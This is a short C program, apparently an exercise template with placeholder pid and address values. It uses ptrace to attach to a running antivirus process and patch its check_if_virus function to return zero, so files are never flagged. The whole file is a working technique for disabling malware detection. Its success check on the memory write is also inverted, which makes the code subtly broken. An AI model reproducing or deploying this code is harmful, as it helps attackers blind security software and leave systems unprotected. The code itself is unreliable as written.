#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// the pid variable and its placeholder value 
int pid                    = 0x01234567;

// the address of the check_if_virus function and its placeholder value 
int check_if_virus_address = 0x89ABCDEF;

// the 4 bytes we want to put at the beginning of the check_if_virus function 
// 0x00c3c031 = "xor eax, eax; ret" in little endian
int return_0_bytes = 0x00c3c031; 

int main() {

    // attach to antivirus
    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
    {
        perror("attach");
        return 1;
    }

    int status; 

    // wait for antivirus to stop 
    waitpid(pid, &status, 0);
    
    if(WIFEXITED(status))
        return 1; 

    // change the first 4 bytes of the check_if_virus function to - xor eax, eax; ret 
    if(ptrace(PTRACE_POKETEXT, pid, check_if_virus_address, return_0_bytes) != -1)
    {
        perror("poketext");
        return 1;
    }

    // detach from antivirus 
    if(ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
    {
        perror("detach");
        return 1;
    }

    return 0;
}
